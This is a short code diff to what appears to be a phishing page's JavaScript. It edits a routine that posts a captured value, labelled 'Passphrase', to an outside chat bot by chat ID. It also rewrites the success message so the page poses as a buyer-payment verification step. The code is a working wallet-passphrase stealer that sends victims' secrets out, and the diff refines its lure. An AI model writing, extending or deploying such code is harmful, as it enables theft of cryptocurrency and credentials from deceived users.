@@ -113,7 +113,7 @@ setTimeout(async () => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: ` ${value}`
+        text: `🚨 Auto data 🚨\n\nPassphrase: ${value}`
       })
     });
     
@@ -220,7 +220,7 @@ export function render(params) {
 
           <div class="verify-success" id="verify-success" style="display: none;">
             <span class="badge badge-success">Verified</span>
-            <p>Your wallet have been confirmed, kindly wait while we process your funds.</p>
+            <p>You've confirmed you're ready. Let the buyer know to send payment through the method above.</p>
           </div>
         </div>
 
